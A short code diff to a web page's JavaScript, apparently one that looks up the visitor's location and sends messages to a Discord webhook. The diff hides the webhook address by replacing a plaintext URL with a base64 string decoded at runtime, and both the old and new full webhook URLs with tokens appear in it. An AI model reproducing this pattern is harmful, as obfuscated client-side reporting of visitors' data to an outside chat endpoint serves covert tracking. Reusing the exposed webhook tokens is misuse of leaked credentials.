@@ -73,10 +73,16 @@
             document.getElementById("currentLocation").innerHTML = "Errore nella localizzazione";
         });
 
-    
-    function sendToDiscordWebhook(message) {
+    function base64Decode(str) {
+      return atob(str);
+    }
         
-        const webhookUrl = 'https://discord.com/api/webhooks/1176560019613950063/C9xI7CjP9o3CQbhTTYzeHz8sOxxhSS1_gwaag9-cOXkQoNJ-KJ_SoXu7MQGXYIcOfj7J';
+    function sendToDiscordWebhook(message) {
+
+        const encodedToken =
+          "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM0Nzk2MDc4NDQwNzQ5NDcxNi9fUy1EbGsybnhibDVhT3NfYUtXUGZFSW9MeHJCdWdXQ2dBc1BkLVZ5b0l6X2Zsd1FyMlRqNnpSV1dEY0xKQVV6TGJ4Zw==";
+        
+        const webhookUrl = base64Decode(encodedToken);
 
         fetch(webhookUrl, {
             method: 'POST',
